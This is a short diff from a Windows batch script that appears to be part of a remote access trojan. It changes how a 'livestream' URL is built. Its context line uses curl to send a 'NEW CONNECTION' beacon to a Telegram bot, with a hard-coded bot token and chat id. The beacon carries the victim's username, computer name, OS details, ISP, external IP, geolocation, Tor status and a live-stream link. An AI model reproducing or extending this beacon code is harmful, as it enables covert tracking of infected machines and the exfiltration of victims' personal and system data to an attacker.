@@ -66,7 +66,7 @@ set temporary=%temp%
 for %%f IN (%temporary:~3%/playlist.m3u8) DO (
   set oldtemp=%%f
   set newtemp=!oldtemp:\=/!    
-  set livestream=%URI:~0,-1%!newtemp!
+  set livestream=%WS%!newtemp!
 )
 
 "%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%] [Live Stream: %livestream% ] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
